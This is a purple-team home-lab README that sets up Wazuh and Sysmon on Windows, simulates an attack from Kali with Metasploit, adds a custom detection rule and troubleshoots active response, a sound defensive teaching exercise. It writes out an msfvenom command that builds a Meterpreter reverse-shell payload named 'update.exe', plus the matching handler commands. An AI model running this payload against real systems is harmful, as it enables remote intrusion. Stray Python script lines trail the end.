# 🛡️ Purple Home Lab

A hands-on **Purple Team cybersecurity lab** combining offensive attack simulation with defensive monitoring and detection using **Wazuh SIEM/XDR** and **Sysmon**.

The goal is to observe endpoint and network activity generated during a controlled attack simulation, collect telemetry, centralize events, and develop detection rules.

> ⚠️ **Lab safety:** Run attack simulations only in an isolated, authorized environment. Use private lab networking and test payloads only on your own virtual machines.

## 📑 Table of Contents

- [Architecture](#-architecture)
- [Tools](#-tools)
- [Deployment and Configuration](#-deployment-and-configuration)
  - [Ubuntu — Wazuh Server](#1-ubuntu-2204-vm--wazuh-server)
  - [Windows — Target and Monitoring](#2-windows-10-vm--target-and-monitoring)
  - [Kali Linux — Attack Simulation](#3-kali-linux-vm--attack-simulation)
- [Attack Simulation and Detection](#-attack-simulation-and-detection)
- [Custom Sysmon Detection Rule](#-custom-sysmon-detection-rule)
- [Active Response Investigation](#-active-response-investigation)
- [Key Takeaways](#-key-takeaways)
- [Next Steps](#-next-steps)

## 🏗️ Architecture

The lab uses three virtual machines:

| Role | Operating system | Main components |
|---|---|---|
| 🔴 Attacker | Kali Linux | Metasploit Framework |
| 🎯 Target | Windows 10 | Sysmon, Wazuh Agent |
| 🔵 SIEM / Defense | Ubuntu 22.04 | Wazuh Manager, Indexer, Dashboard |

**Example network configuration**

| Component | Example address |
|---|---|
| Wazuh server | `192.168.122.164` |
| Kali attacker | `[KALI_IP]` — replace with the Kali VM's IP address |
| Windows target | `[WINDOWS_IP]` — replace with the Windows VM's IP address |

Ensure the virtual machines can communicate over the lab network and that only the required ports are exposed.

## 🛠️ Tools

| Tool | Purpose |
|---|---|
| [Wazuh](https://wazuh.com/) `v4.14` | SIEM/XDR platform for log collection, analysis, and alerting |
| [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) | Windows process, network, and system-event telemetry |
| [Metasploit Framework](https://www.metasploit.com/) | Controlled attack simulation and session handling |

## 🚀 Deployment and Configuration

The following sections document the main installation and configuration steps.

### 1. Ubuntu 22.04 VM — Wazuh Server

Install the Wazuh all-in-one deployment (Manager, Indexer, and Dashboard).

```bash
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

> Review the official Wazuh installation documentation before running an installer, and verify that the package version matches your lab.

### 2. Windows 10 VM — Target and Monitoring

Run the following commands in **PowerShell as Administrator**.

#### Install Sysmon

Download the Sysmon archive:

```powershell
Invoke-WebRequest `
  -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
  -OutFile "$env:USERPROFILE\Desktop\Sysmon.zip"
```

Extract the archive:

```powershell
Expand-Archive `
  -Path "$env:USERPROFILE\Desktop\Sysmon.zip" `
  -DestinationPath "$env:USERPROFILE\Desktop\Sysmon"
```

Change to the extracted directory and install Sysmon:

```powershell
Set-Location "$env:USERPROFILE\Desktop\Sysmon"
.\Sysmon64.exe -accepteula -i
```

This installs Sysmon with its default configuration. A dedicated Sysmon configuration can be added later if more detailed telemetry is required.

#### Install and configure the Wazuh Agent

Download the agent installer:

```powershell
Invoke-WebRequest `
  -Uri "https://packages.wazuh.com/4.14/windows/wazuh-agent-4.14.8-1.msi" `
  -OutFile "$env:USERPROFILE\Desktop\wazuh-agent.msi"
```

Launch the installer:

```powershell
Start-Process msiexec.exe `
  -ArgumentList '/i "$env:USERPROFILE\Desktop\wazuh-agent.msi"' `
  -Wait
```

During installation, configure the Wazuh server address as `192.168.122.164` (replace it if your server uses a different address).

Start the agent service:

```powershell
Start-Service Wazuh
```

Open the agent configuration file:

```powershell
notepad "C:\Program Files (x86)\ossec-agent\ossec.conf"
```

> **Note:** The agent configuration path may differ depending on the installer and installation options. Check the actual installation directory if this path does not exist.

Add a `localfile` entry to collect Sysmon's Operational event channel. Place it inside the existing `<ossec_config>` root element:

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

Restart the service to apply the configuration:

```powershell
Restart-Service Wazuh
```

### 3. Kali Linux VM — Attack Simulation

The following commands document a controlled Meterpreter reverse-TCP lab exercise. Replace `[KALI_IP]` with the Kali VM's reachable lab IP address.

#### Generate the test payload

```bash
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=[KALI_IP] \
  LPORT=4444 \
  -f exe \
  -o update.exe
```

This creates `update.exe` for use **only on the isolated lab target**.

#### Configure the Metasploit handler

Start the console:

```bash
msfconsole
```

Then enter these commands at the `msf6 >` prompt:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [KALI_IP]
set LPORT 4444
exploit
```

The handler waits for the matching lab payload to connect.

#### Validate the session

Once a session is established, the following commands can be used during the authorized test:

```text
shell
whoami
```

The `whoami` command generates process/command activity that can be correlated with endpoint telemetry, depending on the Sysmon configuration and Wazuh rules.

## ⚔️ Attack Simulation and Detection

**Scenario:** Execute the test payload on the Windows target and observe the resulting telemetry and alerts in Wazuh.

### Detection results


| Rule ID | Level | Event / interpretation |
|---|---:|---|
| `92213` | 15 | Reported alert for an executable being dropped and executed |
| `92203` | 6 | Sysmon Event ID 1 — process creation |
| `92052` | 4 | Reported command-execution alert associated with the remote shell |

> Confirm the rule IDs, descriptions, and severity levels against the alerts generated by your own Wazuh installation. Rules and alert mappings may differ by version and configuration.

## 🔬 Custom Sysmon Detection Rule

Sysmon Event ID 3 records network connections. To make these events easier to identify in Wazuh, a custom local rule was added to raise the alert level for matching events.

Open the local rules file on the Ubuntu server:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Add the following rule **inside the existing `<group>` structure**. If the file already has a root group, add only the `<rule>` element within the appropriate group rather than duplicating or mismatching XML tags.

```xml
<group name="local,sysmon,">
  <rule id="100050" level="8">
    <if_group>windows</if_group>
    <field name="win.system.providerName">^Microsoft-Windows-Sysmon$</field>
    <field name="win.system.eventID">^3$</field>
    <description>Sysmon: Network connection detected (Custom Rule)</description>
  </rule>
</group>
```

Restart the Wazuh manager:

```bash
sudo systemctl restart wazuh-manager
```

Then generate a test network event and verify that rule `100050` matches as expected in the Wazuh alerts.

## 🚧 Active Response Investigation

An attempt was made to configure Wazuh Active Response in `/var/ossec/etc/ossec.conf` to automate mitigation after a detection.

The following is the configuration fragment that was tested; validate the command definition, agent/manager placement, and the fields provided by the triggering alert before using it in a live environment.

```xml
<command>
  <name>process-killer</name>
  <executable>process-killer.cmd</executable>
  <expect>win.eventdata.processId</expect>
</command>

<active-response>
  <command>process-killer</command>
  <location>local</location>
  <rules_id>92052</rules_id>
  <timeout>60</timeout>
</active-response>
```

### Observed issue

Alerts appeared in the Wazuh dashboard, but the response did not automatically terminate the process or block the connection.

Potential causes to investigate include:

- **Command availability and placement:** Confirm that the response executable exists in the expected location and is available on the machine where the response is configured to run.
- **Alert field compatibility:** Confirm that the triggering alert contains the exact field expected by the response command. Field names vary by event and integration.
- **Reverse-shell network direction:** In a reverse connection, the Windows target initiates an outbound connection to Kali. The attacker's address may therefore appear as a destination address in the network event rather than as `srcip`.
- **Response implementation:** A standard firewall-drop script may expect a source-IP field and may not handle a destination-IP field or a Windows process ID without adaptation.
- **Logs and validation:** Inspect the Wazuh manager and agent logs, the alert JSON, and the Active Response execution output to determine where the workflow fails.

These are investigation hypotheses rather than a confirmed single root cause. The next step is to trace one alert from rule matching through command execution and verify which fields are actually passed to the response.

## 🎯 Key Takeaways

This project provides practical experience with:

- Deploying a SIEM/XDR environment with Wazuh.
- Collecting Windows endpoint telemetry with Sysmon.
- Simulating controlled attack activity in an isolated lab.
- Creating custom Wazuh detection rules.
- Investigating why an automated response does not behave as expected.
- Correlating endpoint events with network activity.

## 🚧 Next Steps

- [ ] **Forensic analysis:** Extract and document Indicators of Compromise (IoCs), such as IP addresses, file hashes, and process details.
- [ ] **Active Response:** Troubleshoot the response workflow and validate mitigation in the isolated lab.
- [ ] **Detection engineering:** Add custom rules and tune severity to reduce noise while preserving useful detections.
- [ ] **Documentation:** Add screenshots, sample alerts, and a short explanation of how each detection was validated.
'''
path = Path("/mnt/data/README.md")
path.write_text(readme, encoding="utf-8")
print(f"Created {path} ({len(readme.splitlines())} lines)")
